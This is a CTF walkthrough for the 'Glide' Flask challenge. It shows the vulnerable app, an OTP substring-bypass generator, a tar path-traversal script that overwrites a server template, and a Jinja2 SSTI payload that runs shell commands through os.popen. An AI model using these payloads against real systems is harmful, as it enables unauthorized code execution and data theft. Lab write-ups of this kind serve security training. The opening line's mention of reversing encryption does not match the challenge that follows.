# Glide - Flagyard CTF Walkthrough

This is a walkthrough for solving the **Glide** challenge from the **Flagyard CTF**. The challenge involves reversing a custom encryption process to retrieve the original input that satisfies the conditions.

## Challenge Description
### Ice skating? Slide!
This challenge involves a web application that allows users to log in, upload a .tar file, and automatically extract its contents. The goal is to exploit vulnerabilities in the application to achieve Remote Code Execution (RCE).

---

```python
from flask import Flask, render_template, request, redirect, url_for, session, send_from_directory
import os
import random
import string
import time
import tarfile
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = "secretkeyplaceheolder"

def generate_otp():
    otp = ''.join(random.choices(string.digits, k=4))
    return otp

if not os.path.exists('uploads'):
   os.makedirs('uploads')

@app.route('/', methods=['GET', 'POST'])
def main():
    if 'username' not in session or 'otp_validated' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        uploaded_file = request.files['file']
        if uploaded_file.filename != '':
            filename = secure_filename(uploaded_file.filename)
            file_path = os.path.join('uploads', filename)
            uploaded_file.save(file_path)
            session['file_path'] = file_path
            return redirect(url_for('extract'))
        else:
            return render_template('index.html', message='No file selected')
    return render_template('index.html', message='')

@app.route('/extract')
def extract():
    if 'file_path' not in session:
        return redirect(url_for('login'))
    file_path = session['file_path']
    output_dir = 'uploads'
    if not tarfile.is_tarfile(file_path):
        os.remove(file_path)
        return render_template('extract.html', message='The uploaded file is not a valid tar archive')
    with tarfile.open(file_path, 'r') as tar_ref:
        tar_ref.extractall(output_dir)
        os.remove(file_path)
    return render_template('extract.html', files=os.listdir(output_dir))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        if username == 'admin' and password == 'admin':
            session['username'] = username
            return redirect(url_for('otp'))
        else:
            return render_template('login.html', message='Invalid username or password')
    return render_template('login.html', message='')

@app.route('/otp', methods=['GET', 'POST'])
def otp():
    if 'username' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        otp,_otp = generate_otp(),request.form['otp']
        if otp in _otp:
            session['otp_validated'] = True
            return redirect(url_for('main'))
        else:
            time.sleep(10) # please don't bruteforce my OTP
            return render_template('otp.html', message='Invalid OTP')
    return render_template('otp.html', message='')

@app.route('/logout')
def logout():
    session.pop('username', None)
    session.pop('otp_validated', None)
    session.pop('file_path', None)
    return redirect(url_for('login'))

@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    uploads_path = os.path.join(app.root_path, 'uploads')
    return send_from_directory(uploads_path, filename)

if __name__ == '__main__':
    app.run(debug=True)
```

## Functionality

    Login: Users must log in with the credentials admin:admin.

    OTP Validation: After logging in, users are prompted to enter a One-Time Password (OTP).

    File Upload: Once authenticated, users can upload a .tar file.

    File Extraction: The uploaded .tar file is automatically extracted.

## Vulnerabilities

### 1. OTP Bypass

The OTP validation is flawed. The application checks if the generated OTP is a substring of the user's input. This allows us to bypass the OTP by submitting a string containing all possible 4-digit combinations.

### Exploit Script

```python
print("".join(f"{a}{b}{c}{d}" for a in range(10) for b in range(10) for c in range(10) for d in range(10)))
```

### 2. Path Traversal in Tar Extraction

The application uses secure_filename() to sanitize the uploaded file's name, but it does not sanitize filenames inside the .tar archive. This allows us to exploit path traversal by crafting a malicious .tar file.

### Malicious Tar Creation Script

```python
import tarfile
import os

# Create a directory for the malicious payload
os.makedirs("malicious_payload", exist_ok=True)

# Define the malicious HTML file and its content
malicious_file = "malicious_payload/extract.html"
html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>Malicious Page</title>
</head>
<body>
    <h1>You've been exploited!</h1>
    <p>{{7*7}}</p>
    <textarea type="text" rows="40" cols="50" id="page" name="page" >{{7*7}}</textarea>
</body>
</html>
"""

with open(malicious_file, "w") as f:
    f.write(html_content)

# Define the target path for traversal (e.g., ../../extract.html)
traversal_path = "../templates/extract.html"

# Create the tar file
with tarfile.open("file.tar.gz", "w:gz") as tar:
    tar.add(malicious_file, arcname=traversal_path)

print("[+] Malicious tar.gz created successfully.")
```

---

## Exploitation

Step 1: Bypass OTP

    Log in with admin:admin.

    Submit the string generated by the OTP bypass script.

Step 2: Upload Malicious Tar File

    Upload the crafted .tar file.

    The file will be extracted, and the malicious extract.html will be placed in the templates directory.

Step 3: Trigger SSTI

    Access the extract.html page.

    The Server-Side Template Injection (SSTI) payload will execute, allowing Remote Code Execution (RCE).

### Final SSTI Payload

```html
{{config.__class__.__init__.__globals__['os'].popen('cat $(find / -name flag.txt 2>/dev/null)').read()}}
```

## Conclusion

This challenge demonstrates how improper handling of file uploads and OTP validation can lead to severe vulnerabilities like path traversal and SSTI. By exploiting these weaknesses, we achieved Remote Code Execution (RCE) and retrieved the flag.

### Contact me: 

<a href="https://www.instagram.com/t2tt/" style="color: white; text-decoration: none;">
  <img src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg" alt="Instagram" width="30" />
</a>

